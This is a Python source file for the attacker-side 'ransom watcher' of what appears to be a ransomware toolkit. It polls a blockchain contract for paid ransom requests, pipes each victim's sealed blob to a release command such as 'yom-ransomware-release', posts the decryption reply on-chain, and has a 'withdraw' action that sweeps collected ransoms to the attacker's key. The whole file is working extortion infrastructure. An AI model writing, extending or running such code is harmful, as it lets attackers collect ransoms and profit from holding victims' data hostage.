"""The attacker watcher: answer paid requests on-chain.

Runs on the attacker host. For every paid, unanswered request it hands the
opaque on-chain blob to a *release command* (stdin = blob, stdout = reply) and
posts the reply with submitReply. The release command belongs to whichever
payload sealed the blob (for ransomware: ``yom-ransomware-release``); this
piece never opens it.

    yom-ransom-watcher run        loop forever (started at boot when auto)
    yom-ransom-watcher once       answer what is pending now, then exit
    yom-ransom-watcher status     list requests, read-only
    yom-ransom-watcher withdraw   sweep collected ransoms
"""

import argparse
import json
import subprocess
import sys
import time

from eth_account import Account

from software.core import events, ready, settings
from software.ransom_payment.runtime import chain

PIECE = "ransom_watcher"


def load_cfg(base=None) -> dict:
    return settings.load(PIECE, base)


def attacker_account(cfg: dict):
    return Account.from_key(cfg["attacker_private_key"])


def release(cfg: dict, blob: bytes) -> bytes:
    argv = cfg.get("release_argv")
    if not argv:
        raise RuntimeError("no release command configured for this watcher")
    done = subprocess.run(argv, input=blob, capture_output=True, timeout=120)
    if done.returncode != 0:
        raise RuntimeError(f"release command failed: {done.stderr.decode(errors='replace').strip()}")
    reply = done.stdout.strip()
    if not reply:
        raise RuntimeError("release command printed no reply")
    return reply


def answer_pending(cfg: dict, base=None) -> list:
    account = attacker_account(cfg)
    onchain = chain.onchain_attacker(cfg)
    # The contract only accepts submitReply from its deployer. Check locally
    # first: a stale key would otherwise burn gas on a guaranteed revert.
    if onchain.lower() != account.address.lower():
        raise RuntimeError(f"this key ({account.address}) is not the contract's attacker ({onchain})")
    answered = []
    for entry in chain.poll_requests(cfg):
        if entry["answered"]:
            continue
        try:
            reply = release(cfg, entry["blob"])
        except RuntimeError as error:
            events.emit("release_failed", piece=PIECE, base=base, request_id=entry["id"],
                        error=str(error))
            continue
        tx_hash = chain.submit_reply(cfg, account, entry["id"], reply)
        events.emit("replied", piece=PIECE, base=base, request_id=entry["id"],
                    victim=entry["victim"], tx=tx_hash)
        answered.append({"id": entry["id"], "transaction_hash": tx_hash})
    return answered


def wait_until_ready(cfg: dict):
    ready.wait_rpc(cfg["rpc_url"], cfg["chain_id"], timeout=1800)
    address = ready.wait(lambda: chain.discover_contract(cfg), "contract address", timeout=1800)
    ready.wait_code(cfg["rpc_url"], address, timeout=1800)
    return address


def run_forever(cfg: dict, base=None):
    address = wait_until_ready(cfg)
    events.emit("watching", piece=PIECE, base=base, contract=address)
    print(f"watcher: contract {address}; answering paid requests", flush=True)
    while True:
        try:
            for item in answer_pending(cfg, base):
                print(f"watcher: answered request {item['id']} ({item['transaction_hash']})", flush=True)
        except (OSError, RuntimeError, TimeoutError, ValueError) as error:
            print(f"watcher: {error}", flush=True)
        time.sleep(cfg.get("poll_seconds", 5))


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("action", choices=["run", "once", "status", "withdraw"])
    args = parser.parse_args(argv)
    cfg = load_cfg()
    if args.action == "run":
        run_forever(cfg)
    elif args.action == "once":
        result = answer_pending(cfg)
        print(json.dumps(result, indent=2) if result else "no unanswered requests")
    elif args.action == "status":
        for entry in chain.poll_requests(cfg):
            state = "ANSWERED" if entry["answered"] else "waiting for attacker"
            print(f"request {entry['id']} from {entry['victim']} -> {state}")
    elif args.action == "withdraw":
        print(f"ransoms swept: {chain.withdraw(cfg, attacker_account(cfg))}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
